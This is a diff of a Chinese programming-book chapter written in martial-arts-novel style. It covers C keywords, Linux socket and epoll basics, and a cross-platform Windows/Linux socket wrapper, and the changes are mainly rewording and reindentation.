@@ -1,30 +1,30 @@
 # 第7章-真气-遗失的网络IO
 
-    华山派除了练气的华山剑法, 其实还有一本被遗忘的神功, 紫霞真气. 也许正是靠它,
-    当年气宗整体压住了剑宗. 后期随着气宗修习紫霞真气的资格越来越高, 导致气宗衰败. 
-    紫霞神功也在江湖中失传. 同样编程中也有个遗失的学习领域, 网络开发. 学习成本陡峭,
-    开发成本不低, 阻挡了一批有一批想了解服务器开发的生源. 好在有不少巅峰的网络库吼
-    住了互联网的基石. 导致重新搭建网络IO 轮子价值变低. 但如果想飞的更高, 或许 ~ 
-    此刻不妨随我翻开远古大能们遗留的书章, 感受下那些年可以吹的NB. 友情提示, 本书
-    写到这, 可以发现非常注重实战技巧, 忽略缘由. 因为授之以渔, 你还要有欲望, 才能驱
-    动. 倒不如授之以臭鳜鱼, 说不定还能爽一口. 
+    华山派除了练气的华山剑法, 还曾有一本被遗忘的神功, 紫霞真气. 也许正是靠它, 当
+    年气宗整体压过剑宗. 后期随着气宗能够修习紫霞真气的资格越来越高, 导致气宗衰败. 
+    紫霞神功也在江湖中失传. 同样编程中也有个遗失的学习领域, 网络开发. 学习成本陡峭
+    , 开发成本不低, 阻挡了一批又一批想了解服务器开发的生源. 好在江湖中有不少巅峰的
+    网络库吼住了互联网的基石. 导致重新搭建网络IO 轮子价值变低. 但如果想飞的更高, 
+    或许 ~ 此刻不妨随我翻开远古大能们遗留的书章, 感受下那些年可以吹的NB. 友情提示,
+    本书写到这, 可以发现非常注重实战技巧, 忽略缘由. 因为授之以渔, 你还要有欲望, 才
+    能驱动. 倒不如授之以臭鳜鱼, 说不定还能爽一口. 
 
-    文末既有可能, 分享江湖中一个化神前辈的元婴功法, 网络 IO poll 模型. 全章流程
-    渐进, 需要反复回溯, 必有豁然开朗醍醐灌顶. 修真, 修炼, 一个不可说的秘密就是,
-    有了时间就有了一切基础. 例如 <<无尽剑装>> 中主角成圣无不是靠寿元对磨求道 ~
+    文末既有可能, 分享江湖中一个化神前辈的元婴功法, 网络 IO poll 模型. 全章流程迂
+    回递进, 需要反复回溯, 必有豁然开朗醍醐灌顶. 修真, 修炼, 一个不可说的秘密就是,
+    时间有了就满足一切基础. 例如 <<无尽剑装>> 中主角成圣无不是靠寿元兑磨求道 ~
 
     不妨扯一下以前修炼的经验, 当初刚做开发时候. 公司朴实的前辈说, 搞个 TCP 估计1
     年就过去了. 后来想想还真是, 虽然到现在还是水经验. 但有一点可以确定, 编程, 修
-    炼并不是一个青春饭. 很需要底蕴, 和积累. 投机倒把很难干成一件长时间的事情. 大佬
-    赠我越努力越幸运. 我也有个小窍门送给修真路上的道友们 : 当你有一天, 打游戏了累
-    了, 刚好没对象. 那就打开记事本, 翻开页面, 搞代码瞎玩吧.    
+    炼并不是一个青春饭. 很需要底蕴和积累. 投机倒把很难干成一件长时间的事情. 大佬
+    赠我越努力越幸运. 我也有个小窍门送给修真路上的道友们 : 当你有一天, 打游戏了
+    累了, 刚好没对象. 那就打开记事本, 翻开页面, 秀出你的神之一技吧~   
 
     山中不知岁月, 一切刚刚开始 ~
 
 ## 7.1 筑基回顾, 回忆哈 C
 
-    C 语言老了, 目前而言(2017年9月4日) C 语言中有 32 + 5 + 7 = 44 个关键字. 
-    具体如下 O(∩_∩)O 哈 :
+    C 语言老了, 目前而言(2017年) C 语言中有 32 + 5 + 7 = 44 个关键字. 具体如
+    下 O(∩_∩)O 哈 :
 
 -> C89 版本关键字
 
@@ -54,7 +54,8 @@
 | _Alignas | _Alignof | _Atomic | _Generic | _Noreturn | _Static_assert | _Thread_local |
 |          |          |         |          |           |                |               |
 
-    随后会细细分析起具体用法, 每个平台的时间会有些差别. C11 最强, C89 最稳. 
+    随后会细细分析其具体用法, 每个平台的时间会有些差别. C11 最强, C89 最稳. 
+    主要目的是通过会议中, 让大家记起远古的信仰.
 
 ### 7.1.1 C89 32 个关键字
 
@@ -71,8 +72,8 @@
     uint8_t  -> unsigned char
 ```  
 
-        扯淡一点, 程序开发最常遇到的就是自解释问题. 鸡生蛋, 蛋生鸡. 后面再分析 signed 和 
-        unsigned.
+        扯淡一点, 程序开发最常遇到的就是自解释问题. 鸡生蛋, 蛋生鸡. 后面再分析 signed 
+        和 unsigned.
     演示 :
 
 ```C
@@ -86,7 +87,7 @@ printf("c = %d, c = %c.\n", c);
     2) short
     解释 :
         声明变量的时候用! 
-        short 占2字节, 为无符号的. 默认自带signed. 范围[-2^15, 2^15 - 1] 
+        short 占2字节, 为无符号的. 默认自带 signed. 范围 [-2^15, 2^15 - 1] 
         2^15 = 32800. 推荐使用 int16_t or uint16_t 类型.
 
     演示 :
@@ -126,8 +127,8 @@ unisgned float f = 0.11f;   // 错误
     5) long
     解释 :
         声明变量的时候用!
-        长整型 x86 上四字节, x64 上8字节. 一定不比 int 字节数少.
-        C99之后出现long long类型8字节.
+        长整型 x86 上四字节, x64 有的平台是八字节. 一定不比 int 字节数少.
+        C99 之后出现 long long 类型8字节.
 
     演示 :
 
@@ -220,7 +221,8 @@ struct cjson {
 };
 ```
 
-    再来一种 union用法, 利用内存对齐.
+    再来一种 union用法, 利用内存对齐得到机器的大小端. 其实有的编译器也有宏辅助
+    判断大小端情况.
 
 ```C
 // 12.0 判断是大端序还是小端序, 大端序返回true
@@ -969,7 +971,7 @@ int main(int argc, char * argv[]) {
 ```
 
     具体的执行结果, 你也懂就那样. 原子操作, 对于写出高效代码很重要. 
-    可惜微软太硬, 有机会下次写书来个全本 linux 版本的 ~ 去 CL 体系构建.
+    可惜微软太硬, 有机会下次写书来个全本 linux 版本的 ~ 去掉 CL 体系构建.
 
     41) _Generic
     解释 :
@@ -1019,9 +1021,9 @@ _Noreturn void suicide(void) {
 ```
 
     再扯一点, GCC 中等同于 __attribute__((__noreturn__)), 在 VC 中相似功能是 
-    __declspec(noreturn). 它不是说函数没有返回值, 而是说一旦你调了这个函数, 它存在
-    永远不会返回的情况. 一些函数是永远不会返回的, 比如 abort 或者 exit 之类, 调用它
-    们就意味着结束程序. 所以 warning 就显得没有必要.
+    __declspec(noreturn). 它不是说函数没有返回值, 而是说一旦你调了这个函数, 它
+    存在永远不会返回的情况. 一些函数是永远不会返回的, 比如 abort 或者 exit 之类, 
+    调用它们就意味着结束程序. 所以编译器再给出 warning 就显得没有必要.
 
     43) _Static_assert
     解释 :
@@ -1040,8 +1042,8 @@ _Static_assert(__STDC_VERSION__ >= 201112L, "C11 support required");
     解释 :
         到这里快扯完了, 其实 C11标准是个很好的尝试. 为C引入了线程和原子操作. 
         各种安全特性补充. 可以说 C强大了. 但是还远远不够, 因为越来越丑了. 
-        C11 为 C 引入了线程在头文件 threads.h 中定义. 一如既往也允许编译可以不实现.
-        _Thread_local 是新的存储类修饰符, 限定了变量不能在多线程之间共享.
+        C11 为 C 引入了线程在头文件 threads.h 中定义. 一如既往也允许编译可以不
+        实现. _Thread_local 是新的存储类修饰符, 限定了变量不能在多线程之间共享.
 
     演示 :
 
@@ -1064,9 +1066,9 @@ extern void * __cdecl pthread_getspecific (pthread_key_t key);
 ```
 
     pthread_key_create 创建私有变量, 且需要注册销毁行为. 随后是删除, 设置, 获取
-    操作. 从实现而言, 线程私有变量其实是公有变量模拟的. 开发中推荐少用线程私有变量,
-    有数量限制. 到这里关于 C修炼的筑基期, 语法层面的回顾就完毕了. 
-    不知不觉新的呼喊已经到来, 期待笑和痛, 收拾行囊 ~ 
+    操作. 从实现而言, 线程私有变量其实是公有变量模拟映射的. 开发中推荐少用线程私有
+    变量,有数量限制. 到这里关于 C修炼的筑基期, 语法层面的回顾就完毕了. 
+    不知不觉新的呼喊已经到来, 期待笑和痛, 收拾行囊 ~ 出发
 
 ***
     游子吟
@@ -1081,8 +1083,9 @@ extern void * __cdecl pthread_getspecific (pthread_key_t key);
 
 ## 7.2 C 语言 SOCKET 编程指南
 
-    有了 C 基础语法支持, 随后一举破筑基, 拿下常见 socket api 基础操作. 
-    很久以前整理过一个学习手册, 借花献佛温故哈那些必备 socket 相关知识.
+    有了 C 基础语法支持, 随后一举破筑基, 拿下常见 socket api 基础操作. 网络编程
+    基础知识, 可以说成为高级大头兵一个卡. 很久以前整理过一个学习手册, 借花献佛温故
+    哈那些必备 socket 相关知识. 协助飞跃 ~
 
 ### 7.2.1 一切刚刚开始
 
@@ -2040,7 +2043,7 @@ fcntl(s, F_SETFL, mode | O_NONBLOCK);
 
 ### 7.2.5 编程拓展
 
-    说了那么多, 后面也许是高潮, 更多还是回顾. 因为一开始就已经绝对了.
+    说了那么多, 后面也许是高潮, 更多还是回顾. 因为一开始就已经决定了.
 
 **select() 多路复用 I/O**
 
@@ -2189,7 +2192,8 @@ int main(int argc, char * argv[]) {
           TCP 连接在收到一个 FIN 后仍能发送数据. 首先进行关闭的一方将执行主动关闭,
           而另一方执行被动关闭.
 
-    下面是一个更详细的图解, TCP 关闭的四次分手过程
+    下面是一个更详细的图解, TCP 关闭的四次分手过程(其实最好看 TCP 实现, 上面都是加
+    深层面, 和具体实现的字节, 标识等等有些差异.)
 
 ![四次分手详细](./img/四次分手详细.png)
     
@@ -2223,13 +2227,13 @@ epoll 简单服务器文件 : epoll_srvone.c
 
 ```C
 #include <time.h>
+#include <fcntl.h>
 #include <errno.h>
 #include <stdio.h>
 #include <string.h>
 #include <limits.h>
 #include <stdlib.h>
 #include <netdb.h>
-#include <fcntl.h>
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <sys/epoll.h>
@@ -2403,34 +2407,35 @@ clt_run(int fd, int efd) {
 }
 ```
 
-    如果你抄写完毕, 再执行编译后, 通过 telnet 可以简单测试测试. 到这里关于 
-    C 基础 SOCKET 开发回顾基本结束了, 应该带领了一些人走进了 Linux socket 开发
-    的大门吧. 错误是难免的, 抄袭创新也是难免的. 毕竟一山还比一山高!
+    如果你抄写完毕, 再执行编译后, 通过 telnet 可以简单测试测试. 到这里关于 C 基础 
+    SOCKET 开发回顾基本结束了, 应该带领了一些人走进了 Linux socket 开发的大门吧. 
+    错误是难免的, 抄袭创新也是纯水推广的. 毕竟一山还比一山高!
 
-    当然了这仅仅是 linux socket 部分, 后面也会通过一个巧妙的思路来上手 winds 
-    socket. 部分 ~ 还有网络 IO 的封装, 哈哈, 祝你好运小伙!
+    当然这仅仅是 linux socket 部分, 后面也会通过一个巧妙思路来上手 winds socket.
+    部分 ~ 还有网络 IO 的封装, 哈哈, 祝你好运小伙!
 
-## 7.3 金丹轰击 socket 寂灭
+## 7.3 轰击金丹 socket 基础终章
 
-    很高兴能到这里, 后面的这些封装可能让你在实战中势如破竹. 至少解决客户端业务如鱼得水.
-    因为通过上面的基础稳固, 大体上回忆起 linux socket 有哪些 api 用法. 那 winds 呢.
-    这是个问题, 解决思路有很多, 多数人解决方案喜欢构建一套通用接口, 分别实现. 这里介绍
-    一个更加巧妙的实现, 就是在 winds 上面极大可能的模拟 linux api 用法. 这样以后移植大
-    佬代码提供极大方面. 那么无外乎 errno 机制, read , write 机制, 还有接口的细节上移植.
-    有了这些思路那我们开始搞起.
+    很高兴能到这里, 后面的这些封装可能让你在实战中势如破竹. 至少解决客户端业务如鱼
+    得水. 因为通过上面的基础稳固, 大体上回忆起 linux socket 有哪些 api 用法. 那 
+    winds 呢. 这是个问题, 解决思路有很多, 多数人解决方案喜欢构建一套通用接口, 分别
+    实现. 这里介绍一个更加巧妙的实现, 就是在 winds 上面极大可能的模拟 linux api 用
+    法. 这样以后移植大佬代码提供极大方面. 那么无外乎 errno 机制, read , write 机制,
+    还有接口的细节上移植. 采用这个思路那我们开始搞起.
 
 ### 7.3.1 winds socket 实现 errno
 
-    其实 winds 本身也有 errno, 但是在 socket 操作的时候, 走另一套机制 WSAGetLastError.
-    那么就对它下手. 
+    winds 本身也有 errno, 但是在 socket 操作的时候, 走另一套机制 WSAGetLastError.
+    那么就对它进行外科手术. 
 
 ```C
 #undef	errno
 #define	errno                   WSAGetLastError()
 ```
 
-    同样 errno 得到错误码, 如何转成错误字符串. 例如 strerror. 对于 winds socket 很抱歉
-    没有这样的函数. 但是没关系, 我们自己实现. 大家不妨看看 winerror.h 文件, 豁然开朗
+    同样 errno 得到错误码, 如何转成错误字符串(strerror). 对于 winds socket 很抱
+    歉没有提供这么完备的函数. 但是没关系, 我们自己实现. 大家不妨看看 winerror.h 文件,
+    豁然开朗
 
 ```C
 // winerror.h 摘选部分
@@ -2456,8 +2461,8 @@ clt_run(int fd, int efd) {
 ......
 ```
 
-    大家有没有一点明白了, 上面很有规律不是吗. 通过这个规律我们就能自己实现一个 strerror 相似
-    的函数. 看我的一种实现模板
+    大家有没有一点明白了, 上面很有规律不是吗! 通过这个规律我们就能自己实现一个 strerror 
+    相似的函数. 看我的一种实现模板
 
 strerr.c.template
 
@@ -2467,7 +2472,7 @@ strerr.c.template
 #include <string.h>
 
 extern inline const char * strerr(int error) {
-	return strerror(error);
+    return strerror(error);
 }
 
 #endif
@@ -2480,13 +2485,13 @@ extern inline const char * strerr(int error) {
 #define DWORD int
 
 extern const char * strerr(int error) {
-	switch (error) {
+    switch (error) {
     case {MessageId} : return "{MessageText}";
     ......
     }
 
-	fprintf(stderr, "strerr invaild error = %d.\n", error);
-	return "The aliens are coming. Go tell your favorite people";
+    fprintf(stderr, "strerr invaild error = %d.\n", error);
+    return "The aliens are coming. Go tell your favorite people";
 }
 
 #undef DWORD
@@ -2516,7 +2521,7 @@ extern const char * strerr(int error) {
 
 #include <fcntl.h>
 #include <signal.h>
-#include <schead.h>
+#include "schead.h"
 
 //
 // IGNORE_SIGPIPE - 管道破裂,忽略SIGPIPE信号
@@ -2635,7 +2640,7 @@ extern void socket_start(void);
     INVALID_SOCKET 和 SOCKET_ERROR 是 linux 模拟 winds 严谨的错误验证. 前者用于
     默认无效的 socket 对象, 后者用于各种 socket 接口执行错误的时候返回的值. linux
     上 EWOULDBOCK 宏已经取消和 EAGAIN 宏功能重叠(socket 层面表示缓冲区已经读取空了)
-    , 为了接口统一操作, 额外添加上. 其中ECONNECTED 宏单独添加上的为了解决非阻塞的 
+    , 为了接口统一操作, 额外添加上. 其中 ECONNECTED 宏单独添加上的为了解决非阻塞的 
     connect 操作状态不一样问题. 其它的随后用上的时候你会豁然开朗. 
 
 ```C
@@ -2643,30 +2648,30 @@ extern void socket_start(void);
 
 inline int
 gettimeofday(struct timeval * tv, void * tz) {
-	struct tm st;
-	SYSTEMTIME wtm;
+    struct tm st;
+    SYSTEMTIME wtm;
 
-	GetLocalTime(&wtm);
-	st.tm_year = wtm.wYear - 1900;
-	st.tm_mon = wtm.wMonth - 1; // window的计数更好些
-	st.tm_mday = wtm.wDay;
-	st.tm_hour = wtm.wHour;
-	st.tm_min = wtm.wMinute;
-	st.tm_sec = wtm.wSecond;
-	st.tm_isdst = -1; // 不考虑夏令时
+    GetLocalTime(&wtm);
+    st.tm_year = wtm.wYear - 1900;
+    st.tm_mon = wtm.wMonth - 1; // window的计数更好些
+    st.tm_mday = wtm.wDay;
+    st.tm_hour = wtm.wHour;
+    st.tm_min = wtm.wMinute;
+    st.tm_sec = wtm.wSecond;
+    st.tm_isdst = -1; // 不考虑夏令时
 
-	tv->tv_sec = (long)mktime(&st); // 32位使用数据强转
-	tv->tv_usec = wtm.wMilliseconds * 1000; // 毫秒转成微秒
+    tv->tv_sec = (long)mktime(&st); // 32位使用数据强转
+    tv->tv_usec = wtm.wMilliseconds * 1000; // 毫秒转成微秒
 
-	return 0;
+    return 0;
 }
 
 #endif
 ```
 
-    对于 gettimeofday 接口 linux 上面应用的非常广泛. 但是前面可以知道完全可以通过
-    time_get 更加优美的得到你想要得时间. 但是为了让有些程序好移植, 所以在 winds 上面
-    了一套. 还有个下面函数非常有意思
+    对于 gettimeofday 接口 linux 上面应用的非常广泛. 但是前面已经知道完全可以通过
+    time_get 更加优美的得到你想要得时间. 但是为了让有些程序好移植, 所以在 winds 上
+    面了一套. 还有个下面函数非常有意思
 
 ```C
 inline void 
@@ -2681,9 +2686,9 @@ socket_start(void) {
 }
 ```
 
-    在 winds 上面 WSAStartup 和 WSACleanup 总是成双成对出现. 但是我们这里这个 socket
-    模拟 linux, linux 默认程序内嵌了相关模块 so 启动操作. 所以走全局, 有的朋友喜欢这么
-    额外添加下面一句
+    在 winds 上面 WSAStartup 和 WSACleanup 总是成双成对出现. 但是我们这里这个模块是
+    模拟 linux 上 socket. linux 默认程序内嵌了相关 socket 模块 so 启动操作. 所以走
+    全局, 没有使用卸载操作. 有的朋友喜欢这么额外添加下面一句
 
 ```C
 static inline void _socket_start(void) {
@@ -2695,8 +2700,9 @@ static inline void _socket_start(void) {
 
     这样做其实就是画蛇添足. 为啥呢, 在程序 exit 时候, 如果服务器的网络相关操作线程退出
     顺序是不确定的. 一旦 _socket_start 先触发, 对于其它调用方面就是各种 error 抛出来.
-    倒不如走程序全局声明周期, 交给系统进程处理. 对于 EAGAIN_WOULDBOCK 宏, 用起来也是
-    很飘
+    倒不如走程序全局声明周期, 交给系统进程处理. 
+
+    对于 EAGAIN_WOULDBOCK 宏, 用起来也是很飘
 
 ```C
 switch (errno) {
@@ -2706,7 +2712,7 @@ case EAGAIN_WOULDBOCK:
 }
 ```
 
-    是不是很巧妙. 面对 linux 过度封装的 errno 机制处理起来变得很清晰吧. 
+    是不是很巧妙. 面对 linux 过度封装的 errno 机制处理起来也变得很清晰吧. 
     随后看 scsocket.h 具体的业务接口, 本质就是在系统那套接口的基础上加了 socket_ 前缀.
 
 ```C
@@ -2795,40 +2801,40 @@ extern socket_t socket_connectos(const char * host, uint16_t port, int ms);
 ```C
 inline socket_t
 socket_dgram(void) {
-	return socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    return socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);
 }
 
 inline socket_t
 socket_stream(void) {
-	return socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+    return socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
 }
 
 inline int
 socket_close(socket_t s) {
-	shutdown(s, SHUT_WR);
+    shutdown(s, SHUT_WR);
 #ifdef _MSC_VER
-	return closesocket(s);
+    return closesocket(s);
 #else
-	return close(s);
+    return close(s);
 #endif
 }
 
 inline int 
 socket_read(socket_t s, void * data, int sz) {
 #ifdef _MSC_VER
-	return sz > 0 ? recv(s, data, sz, 0) : 0;
+    return sz > 0 ? recv(s, data, sz, 0) : 0;
 #else
-	// linux上面 read 封装了 recv
-	return read(s, data, sz);
+    // linux上面 read 封装了 recv
+    return read(s, data, sz);
 #endif
 }
 
 inline int 
 socket_write(socket_t s, const void * data, int sz) {
 #ifdef _MSC_VER
-	return send(s, data, sz, 0);
+    return send(s, data, sz, 0);
 #else
-	return write(s, data, sz);
+    return write(s, data, sz);
 #endif
 }
 
@@ -2853,15 +2859,15 @@ socket_addr(const char * ip, uint16_t port, sockaddr_t * addr) {
 }
 ```
     
-    不知道你看完 socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP); 有什么话说, 这就是
-    逼格. PF_INET 用于声明套接字类型. AF_INET 用于 socket 地址类型. 值一样, 设计
-    意图不一样. 第三个参数有点装, 最通用的写法用0代替, 走默认第一个. 其中对于
+    不知道看完 socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP); 有什么话说, 这就是逼
+    格. PF_INET 用于声明套接字类型. AF_INET 用于 socket 地址类型. 值一样, 设计意
+    图不一样. 第三个参数有点装, 最通用的写法用0代替, 走默认第一个. 其中对于
     socket_close 底层默认采用了优雅的关闭, shutdown 等待服务器所有数据写完毕. 这
     也是 SHUT_WR 宏 winds 实现的意义. 再看 socket_read 的时候, 不知道你是否好奇.
     因为 winds 和 linux 对于 recv 处理非法输入的行为不一样. linux sz = 0 会立即
     返回, 但是 winds 会阻塞住, 算是 winds 一个 bug 吧, 它可能没有检查直接抛入到发
     送层面造成互相等待阻塞了. 我们其实讲了很多, 但你会发现学的很快. 主要原因是我们
-    从实践剑宗出发, 快速战斗, 但缺少底蕴. 用的快, 忘记的快, 真真的高手, 一定是气宗,
+    从实践剑宗出发, 快速战斗, 但缺少底蕴. 用的快, 忘记的快, 真真的前辈, 一定是气宗,
     一个绝顶高手一定是剑宗出 ~ 万众五一
 
     再来看看相关辅助操作, 用于 socket 一些控住操作.
@@ -2870,65 +2876,65 @@ socket_addr(const char * ip, uint16_t port, sockaddr_t * addr) {
 inline int
 socket_set_block(socket_t s) {
 #ifdef _MSC_VER
-	u_long mode = 0;
-	return ioctlsocket(s, FIONBIO, &mode);
+    u_long mode = 0;
+    return ioctlsocket(s, FIONBIO, &mode);
 #else
-	int mode = fcntl(s, F_GETFL, 0);
-	if (mode == SOCKET_ERROR)
-		return SOCKET_ERROR;
-	if (mode & O_NONBLOCK)
-		return fcntl(s, F_SETFL, mode & ~O_NONBLOCK);
-	return SufBase;
+    int mode = fcntl(s, F_GETFL, 0);
+    if (mode == SOCKET_ERROR)
+	    return SOCKET_ERROR;
+    if (mode & O_NONBLOCK)
+	    return fcntl(s, F_SETFL, mode & ~O_NONBLOCK);
+    return SufBase;
 #endif	
 }
 
 inline int
 socket_set_nonblock(socket_t s) {
 #ifdef _MSC_VER
-	u_long mode = 1;
-	return ioctlsocket(s, FIONBIO, &mode);
+    u_long mode = 1;
+    return ioctlsocket(s, FIONBIO, &mode);
 #else
-	int mode = fcntl(s, F_GETFL, 0);
-	if (mode == SOCKET_ERROR)
-		return SOCKET_ERROR;
-	if (mode & O_NONBLOCK)
-		return SufBase;
-	return fcntl(s, F_SETFL, mode | O_NONBLOCK);
+    int mode = fcntl(s, F_GETFL, 0);
+    if (mode == SOCKET_ERROR)
+	    return SOCKET_ERROR;
+    if (mode & O_NONBLOCK)
+	    return SufBase;
+    return fcntl(s, F_SETFL, mode | O_NONBLOCK);
 #endif	
 }
 
 static inline int _socket_set_enable(socket_t s, int optname) {
-	int ov = 1;
-	return setsockopt(s, SOL_SOCKET, optname, (void *)&ov, sizeof ov);
+    int ov = 1;
+    return setsockopt(s, SOL_SOCKET, optname, (void *)&ov, sizeof ov);
 }
 
 inline int
 socket_set_reuseaddr(socket_t s) {
-	return _socket_set_enable(s, SO_REUSEADDR);
+    return _socket_set_enable(s, SO_REUSEADDR);
 }
 
 inline int 
 socket_set_keepalive(socket_t s) {
-	return _socket_set_enable(s, SO_KEEPALIVE);
+    return _socket_set_enable(s, SO_KEEPALIVE);
 }
 
 static inline int _socket_set_time(socket_t s, int ms, int optname) {
-	struct timeval ov = { 0,0 };
-	if (ms > 0) {
-		ov.tv_sec = ms / 1000;
-		ov.tv_usec = (ms % 1000) * 1000;
-	}
-	return setsockopt(s, SOL_SOCKET, optname, (void *)&ov, sizeof ov);
+    struct timeval ov = { 0,0 };
+    if (ms > 0) {
+	    ov.tv_sec = ms / 1000;
+	    ov.tv_usec = (ms % 1000) * 1000;
+    }
+    return setsockopt(s, SOL_SOCKET, optname, (void *)&ov, sizeof ov);
 }
 
 inline int
 socket_set_recvtimeo(socket_t s, int ms) {
-	return _socket_set_time(s, ms, SO_RCVTIMEO);
+    return _socket_set_time(s, ms, SO_RCVTIMEO);
 }
 
 inline int
 socket_set_sendtimeo(socket_t s, int ms) {
-	return _socket_set_time(s, ms, SO_SNDTIMEO);
+    return _socket_set_time(s, ms, SO_SNDTIMEO);
 }
 ```
 
@@ -2938,10 +2944,10 @@ socket_set_sendtimeo(socket_t s, int ms) {
 ```C
 inline int 
 socket_get_error(socket_t s) {
-	int error;
-	socklen_t len = sizeof(error);
-	int code = getsockopt(s, SOL_SOCKET, SO_ERROR, (void *)&error, &len);
-	return code < 0 ? errno : error;
+    int error;
+    socklen_t len = sizeof(error);
+    int code = getsockopt(s, SOL_SOCKET, SO_ERROR, (void *)&error, &len);
+    return code < 0 ? errno : error;
 }
 ```
 
@@ -2953,149 +2959,149 @@ socket_get_error(socket_t s) {
 ```C
 int
 socket_recv(socket_t s, void * buf, int len) {
-	int r;
-	do {
-		r = recv(s, buf, len, 0);
-	} while (r == SOCKET_ERROR && errno == EINTR);
-	return r;
+    int r;
+    do {
+	    r = recv(s, buf, len, 0);
+    } while (r == SOCKET_ERROR && errno == EINTR);
+    return r;
 }
 
 int
 socket_recvn(socket_t s, void * buf, int len) {
-	int r, nlen = len;
-	while (nlen > 0) {
-		r = socket_recv(s, buf, nlen);
-		if (r == 0) break;
-		if (r == SOCKET_ERROR) {
-			RETURN(SOCKET_ERROR, "socket_recv error len = %d, nlen = %d.", len, nlen);
-		}
-		nlen -= r;
-		buf = (char *)buf + r;
-	}
-	return len - nlen;
+    int r, nlen = len;
+    while (nlen > 0) {
+	    r = socket_recv(s, buf, nlen);
+	    if (r == 0) break;
+	    if (r == SOCKET_ERROR) {
+		    RETURN(SOCKET_ERROR, "socket_recv error len = %d, nlen = %d.", len, nlen);
+	    }
+	    nlen -= r;
+	    buf = (char *)buf + r;
+    }
+    return len - nlen;
 }
 
 int
 socket_send(socket_t s, const void * buf, int len) {
-	int r;
-	do {
-		r = send(s, buf, len, 0);
-	} while (r == SOCKET_ERROR && errno == EINTR);
-	return r;
+    int r;
+    do {
+	    r = send(s, buf, len, 0);
+    } while (r == SOCKET_ERROR && errno == EINTR);
+    return r;
 }
 
 int
 socket_sendn(socket_t s, const void * buf, int len) {
-	int r, nlen = len;
-	while (nlen > 0) {
-		r = socket_send(s, buf, nlen);
-		if (r == 0) break;
-		if (r == SOCKET_ERROR) {
-			RETURN(SOCKET_ERROR, "socket_send error len = %d, nlen = %d.", len, nlen);
-		}
-		nlen -= r;
-		buf = (const char *)buf + r;
-	}
-	return len - nlen;
+    int r, nlen = len;
+    while (nlen > 0) {
+	    r = socket_send(s, buf, nlen);
+	    if (r == 0) break;
+	    if (r == SOCKET_ERROR) {
+		    RETURN(SOCKET_ERROR, "socket_send error len = %d, nlen = %d.", len, nlen);
+	    }
+	    nlen -= r;
+	    buf = (const char *)buf + r;
+    }
+    return len - nlen;
 }
 
 inline int
 socket_recvfrom(socket_t s, void * buf, int len, int flags, sockaddr_t * in, socklen_t * inlen) {
-	return recvfrom(s, buf, len, flags, (struct sockaddr *)in, inlen);
+    return recvfrom(s, buf, len, flags, (struct sockaddr *)in, inlen);
 }
 
 inline int
 socket_sendto(socket_t s, const void * buf, int len, int flags, const sockaddr_t * to, socklen_t tolen) {
-	return sendto(s, buf, len, flags, (const struct sockaddr *)to, tolen);
+    return sendto(s, buf, len, flags, (const struct sockaddr *)to, tolen);
 }
 ```
 
-    还是那句话, 山中不知岁月. 其实我很多套路都是从一个叫云风的化神前辈遗留下剑气中, 参悟.
-    得到的. 最终交叉在华山剑法中, 供后来者回忆或演练基础.
+    还是那句话, 山中不知岁月. 其实本文很多套路都是从一个叫云风的化神前辈遗留下剑气中, 
+    参悟得到的. 最终交叉在华山剑法中, 供后来者思索或演练基础.
 
 ```C
 socket_t
 socket_bind(const char * host, uint16_t port, uint8_t protocol, int * family) {
-	socket_t fd;
+    socket_t fd;
     char ports[sizeof "65535"];
-	struct addrinfo hints = { 0 };
-	struct addrinfo * ailist = NULL;
-	if (host == NULL || *host == 0)
-		host = "0.0.0.0"; // INADDR_ANY
+    struct addrinfo hints = { 0 };
+    struct addrinfo * ailist = NULL;
+    if (host == NULL || *host == 0)
+	    host = "0.0.0.0"; // INADDR_ANY
 
-	sprintf(ports, "%hu", port);
-	hints.ai_family = AF_UNSPEC;
-	if (protocol == IPPROTO_TCP)
-		hints.ai_socktype = SOCK_STREAM;
-	else {
-		assert(protocol == IPPROTO_UDP);
-		hints.ai_socktype = SOCK_DGRAM;
-	}
-	hints.ai_protocol = protocol;
+    sprintf(ports, "%hu", port);
+    hints.ai_family = AF_UNSPEC;
+    if (protocol == IPPROTO_TCP)
+	    hints.ai_socktype = SOCK_STREAM;
+    else {
+	    assert(protocol == IPPROTO_UDP);
+	    hints.ai_socktype = SOCK_DGRAM;
+    }
+    hints.ai_protocol = protocol;
 
-	if (getaddrinfo(host, ports, &hints, &ailist))
-		return INVALID_SOCKET;
+    if (getaddrinfo(host, ports, &hints, &ailist))
+	    return INVALID_SOCKET;
 
-	fd = socket(ailist->ai_family, ailist->ai_socktype, 0);
-	if (fd == INVALID_SOCKET)
-		goto _failed_fd;
+    fd = socket(ailist->ai_family, ailist->ai_socktype, 0);
+    if (fd == INVALID_SOCKET)
+	    goto _failed_fd;
 
-	if (socket_set_reuseaddr(fd))
-		goto _failed;
+    if (socket_set_reuseaddr(fd))
+	    goto _failed;
 
-	if (bind(fd, ailist->ai_addr, ailist->ai_addrlen))
-		goto _failed;
-	// Success return ip family
-	if (family)
-		*family = ailist->ai_family;
+    if (bind(fd, ailist->ai_addr, (int)ailist->ai_addrlen))
+	    goto _failed;
+    // Success return ip family
+    if (family)
+	    *family = ailist->ai_family;
 
-	freeaddrinfo(ailist);
-	return fd;
+    freeaddrinfo(ailist);
+    return fd;
 
 _failed:
-	socket_close(fd);
+    socket_close(fd);
 _failed_fd:
-	freeaddrinfo(ailist);
-	return INVALID_SOCKET;
+    freeaddrinfo(ailist);
+    return INVALID_SOCKET;
 }
 
 socket_t
 socket_listen(const char * host, uint16_t port, int backlog) {
-	socket_t fd = socket_bind(host, port, IPPROTO_TCP, NULL);
-	if (fd == INVALID_SOCKET)
-		return INVALID_SOCKET;
+    socket_t fd = socket_bind(host, port, IPPROTO_TCP, NULL);
+    if (fd == INVALID_SOCKET)
+	    return INVALID_SOCKET;
 
-	if (listen(fd, backlog)) {
-		socket_close(fd);
-		return INVALID_SOCKET;
-	}
-	return fd;
+    if (listen(fd, backlog)) {
+	    socket_close(fd);
+	    return INVALID_SOCKET;
+    }
+    return fd;
 }
 ```
 
     这里 socket_bind 能够绑定一个 host 主机地址. 不仅仅是 ip 地址, 同样包括 url 地
